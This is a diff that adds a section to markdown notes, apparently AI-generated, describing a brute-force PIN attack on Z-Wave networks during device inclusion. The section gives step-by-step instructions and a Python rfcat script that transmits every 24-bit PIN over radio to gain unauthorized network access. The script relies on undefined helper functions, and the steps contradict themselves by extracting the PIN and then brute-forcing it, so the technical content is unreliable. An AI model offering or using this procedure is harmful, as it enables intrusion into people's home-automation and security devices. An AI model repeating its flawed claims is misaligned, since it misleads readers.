@@ -244,6 +244,47 @@ Sure, here's the information formatted in Markdown:
 
 6. **Successful Inclusion:**
     - Once the correct PIN is found, the inclusion will succeed, granting access to the Z-Wave network.
+  
+Here are the steps to perform a brute force PIN attack against a Z-Wave network during the inclusion process:
+
+1. Put the Z-Wave network into inclusion mode to trigger a key exchange.
+
+2. Use an RTL-SDR dongle and GNU Radio to capture the network key exchange frame.
+
+3. Extract the 24-bit PIN value from the captured packet.
+
+4. Write a Python script to brute force the PIN:
+
+```python
+import rfcat
+
+# Open connection to Yardstick One 
+d = rfcat.RFcat()
+
+# Set transmission parameters
+d.setFreq(908420000)
+d.setMdmModulation(MOD_2FSK)
+
+# Iterate through all pin combinations
+for pin in range(0, 16777215):
+
+  # Construct inclusion command with pin   
+  pkt = create_inclusion_pkt(pin)
+
+  # Transmit packet
+  d.RFxmit(pkt)
+
+  # Check if inclusion succeeded
+  if inclusion_succeeded():
+    print "[+] PIN found:", pin
+    break
+```
+
+5. Run the brute force script to iterate through all 24-bit PIN combinations.
+
+6. Once the correct PIN is found, the inclusion command will succeed and grant access to the Z-Wave network.
+
+This outlines a brute force attack targeting the PIN exchanged during the inclusion process to gain unauthorized access. The SDR and rfcat library enable automating transmission of all pin combinations.
 
 ### 7.De-encapsulation Attack to Replay Z-Wave Commands:
 
